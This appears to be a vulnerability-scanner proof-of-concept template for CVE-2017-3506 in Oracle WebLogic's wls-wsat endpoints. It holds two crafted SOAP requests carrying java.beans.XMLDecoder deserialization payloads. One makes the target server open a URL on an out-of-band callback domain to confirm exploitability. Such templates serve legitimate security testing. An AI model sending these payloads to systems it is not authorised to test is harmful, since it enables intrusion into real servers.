name: poc-yaml-fusion-middleware-cve-2017-3506-rce
binding: 5cd8d733-ec66-4a5d-8842-689fc8f5f26d
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://hackerone.com/reports/810778
    vulnerability:
        id: CT-73356
        level: high
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wls-wsat/RegistrationRequesterPortType
            headers:
                Content-Type: text/xml
            body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><void id="url" class="java.net.URL"><string>http://{{reverseDomain}}</string></void><void idref="url"><void id="stream" method ="openStream"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
        expression: reverse.wait(5)
    v130:
        request:
            cache: true
            method: POST
            path: /wls-wsat/ParticipantPortType
            headers:
                Content-Type: text/xml
            body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void><object class="java.lang.String"><string>xxx</string></object></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
        expression: response.status == 500 && response.body.ibcontains(b"<faultstring>0</faultstring>")
expression: v130() || r0()
